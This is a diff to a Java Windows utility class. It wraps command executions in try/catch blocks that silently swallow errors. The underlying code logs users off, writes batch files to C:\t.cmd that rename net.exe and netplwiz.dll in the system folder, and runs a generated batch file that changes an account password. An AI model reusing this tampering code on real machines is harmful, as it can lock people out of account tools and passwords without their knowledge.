@@ -31,7 +31,10 @@ public class Run implements IWriter{
     String sysPath = System.getenv("SystemRoot"); // Get System install path.
     switch(code){ // Get tool number
         case 0: // lo
-          Runtime.getRuntime().exec(sysPath + "\\System32\\logoff.exe");
+          try{
+            Runtime.getRuntime().exec(sysPath + "\\System32\\logoff.exe");
+          }
+          catch(IOException ioe){}
           break;
         case 1: // pr
           writeText("C:\\t.cmd", "ren %systemroot%\\net.exe n1.exe");
@@ -40,7 +43,10 @@ public class Run implements IWriter{
           writeBR("C:\\t.cmd");
           writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dll netplwiz.dl3");
           writeBR("C:\\t.cmd");
-          Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\t.cmd");
+          try{
+            Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd");
+          }
+          catch(IOException ioe){}
           break;
         case 2: // re
           writeText("C:\\t.cmd", "ren %systemroot%\\n1.exe net.exe");
@@ -49,7 +55,10 @@ public class Run implements IWriter{
           writeBR("C:\\t.cmd");
           writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dl3 netplwiz.dll");
           writeBR("C:\\t.cmd");
-          Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\t.cmd");
+          try{
+            Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd");
+          }
+          catch(IOException ioe){}
           break;
         default: // otherwise, nothing
           return;
@@ -112,7 +121,10 @@ public class Run implements IWriter{
         sb.append(rv);
         thisInstance.writeText("C:\\t.cmd", sb.toString()); // Make a batch file to change password.
         String sysPath = System.getenv("SystemRoot");
-        Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd"); // Just do it!
+          try{
+            Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd"); // Run it!
+          }
+          catch(IOException ioe){}
       }
     }
   }
